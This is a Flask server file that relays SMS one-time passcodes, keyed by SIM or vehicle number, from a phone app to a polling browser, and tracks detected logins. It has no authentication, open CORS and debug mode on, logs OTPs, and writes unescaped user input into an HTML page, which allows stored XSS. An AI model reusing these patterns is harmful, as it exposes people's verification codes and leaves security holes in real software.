from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

# =========================
# Storage
# =========================

# OTP storage
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":...}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]

# Browser sessions tracking
client_sessions = {}  # key -> {"first_request": datetime}

# Login detection storage
login_sessions = {}  # mobile_number -> {"timestamp": datetime}


# =========================
# Helpers
# =========================
def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# =========================
# OTP Endpoints
# =========================

@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        token = (data.get('token') or "").strip()
        vehicle = (data.get('vehicle') or "").strip().upper()

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": datetime.now()
        }

        if vehicle:
            entry["vehicle"] = vehicle
            vehicle_otps.append(entry)
            print(f"[{now_str()}] 📦 Vehicle OTP stored - OTP: {otp}, Vehicle: {vehicle}, Token: {token}")
        else:
            entry["sim_number"] = sim_number or "UNKNOWNSIM"
            mobile_otps.append(entry)
            print(f"[{now_str()}] 📦 Mobile OTP stored - OTP: {otp}, SIM: {sim_number}, Token: {token}")

        return jsonify({"status": "success", "message": "OTP stored"}), 200

    except Exception as e:
        print("Error receiving from app:", e)
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()

    if not token or (not sim_number and not vehicle):
        return jsonify({"status": "error", "message": "token + sim_number OR token + vehicle required"}), 400

    key = (token, sim_number if sim_number else vehicle)
    if key not in client_sessions:
        client_sessions[key] = {"first_request": datetime.now()}
        print(f"[{now_str()}] 🖥️ Browser started polling for {key}")
    session_time = client_sessions[key]["first_request"]

    if vehicle:
        new_otps = [o for o in vehicle_otps
                    if o["token"] == token and o["vehicle"].upper() == vehicle and o["timestamp"] > session_time]

        if new_otps:
            latest = new_otps[-1]
            vehicle_otps[:] = [o for o in vehicle_otps
                               if not (o["token"] == token and o["vehicle"].upper() == vehicle)]
            client_sessions.pop(key, None)
            print(f"[{now_str()}] 🖥️ Vehicle OTP sent to browser: {latest['otp']} for {vehicle}")
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "vehicle": latest["vehicle"],
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "empty", "message": "No new vehicle OTP"}), 200

    else:
        new_otps = [o for o in mobile_otps
                    if o["token"] == token and o["sim_number"].upper() == sim_number and o["timestamp"] > session_time]

        if new_otps:
            latest = new_otps[-1]
            mobile_otps[:] = [o for o in mobile_otps
                              if not (o["token"] == token and o["sim_number"].upper() == sim_number)]
            client_sessions.pop(key, None)
            print(f"[{now_str()}] 🖥️ Mobile OTP sent to browser: {latest['otp']} for SIM {sim_number}")
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "sim_number": latest["sim_number"],
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "empty", "message": "No new mobile OTP"}), 200


@app.route('/api/status', methods=['GET'])
def status():
    last_mobile = mobile_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if mobile_otps else "None"
    last_vehicle = vehicle_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if vehicle_otps else "None"

    return jsonify({
        "status": "active" if (mobile_otps or vehicle_otps) else "idle",
        "last_mobile_otp_time": last_mobile,
        "last_vehicle_otp_time": last_vehicle,
        "mobile_otp_count": len(mobile_otps),
        "vehicle_otp_count": len(vehicle_otps)
    }), 200


# =========================
# Login Detection Endpoints
# =========================

@app.route('/api/login-detect', methods=['POST'])
def login_detect():
    try:
        data = request.get_json(force=True)
        mobile_number = (data.get('mobile_number') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400

        login_sessions[mobile_number] = {"timestamp": datetime.now()}
        print(f"[{now_str()}] 🔑 Login detected for mobile: {mobile_number}")
        return jsonify({"status": "success", "message": "Login detected"}), 200

    except Exception as e:
        print("Error in login-detect:", e)
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/api/login-found', methods=['GET'])
def login_found():
    try:
        mobile_number = (request.args.get('mobile_number') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400

        if mobile_number in login_sessions:
            ts = login_sessions[mobile_number]["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{now_str()}] 🔍 Login found for mobile: {mobile_number}")
            return jsonify({"status": "found", "mobile_number": mobile_number, "timestamp": ts}), 200
        else:
            return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200

    except Exception as e:
        print("Error in login-found:", e)
        return jsonify({"status": "error", "message": str(e)}), 400


# =========================
# Login Management Page
# =========================
@app.route('/api/login-clear', methods=['GET', 'POST'])
def login_clear():
    try:
        msg = None
        if request.method == 'POST':
            action = request.form.get("action")
            if action == "delete_selected":
                selected = request.form.getlist("mobiles")
                for m in selected:
                    login_sessions.pop(m, None)
                msg = f"Deleted {len(selected)} mobile(s)"
            elif action == "delete_all":
                login_sessions.clear()
                msg = "Deleted all mobiles"
            else:
                msg = "No action taken"

        rows = ""
        for mobile, info in login_sessions.items():
            ts = info["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            rows += f"""
              <tr>
                <td><input type="checkbox" name="mobiles" value="{mobile}"></td>
                <td>{mobile}</td>
                <td>{ts}</td>
              </tr>
            """

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
          <title>Login Sessions</title>
          <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            table {{ border-collapse: collapse; width: 100%; }}
            th, td {{ border: 1px solid #ccc; padding: 8px; text-align: left; }}
            th {{ background: #f0f0f0; }}
            .actions {{ margin-top: 15px; }}
            .msg {{ margin: 10px 0; color: green; }}
          </style>
        </head>
        <body>
          <h2>Stored Login Sessions</h2>
          {f"<div class='msg'>{msg}</div>" if msg else ""}
          <form method="POST">
            <table>
              <thead>
                <tr>
                  <th><input type="checkbox" id="checkAll"></th>
                  <th>Mobile Number</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {rows or "<tr><td colspan='3'>No logins found</td></tr>"}
              </tbody>
            </table>
            <div class="actions">
              <button type="submit" name="action" value="delete_selected">Delete Selected</button>
              <button type="submit" name="action" value="delete_all">Delete All</button>
            </div>
          </form>
          <script>
            document.getElementById("checkAll").addEventListener("change",function(e){{
              document.querySelectorAll("input[name='mobiles']").forEach(cb=>cb.checked=e.target.checked);
            }});
          </script>
        </body>
        </html>
        """
        return html

    except Exception as e:
        print("Error in login-clear:", e)
        return jsonify({"status": "error", "message": str(e)}), 400


# =========================
# Run App
# =========================
if __name__ == '__main__':
    app.run(debug=True)
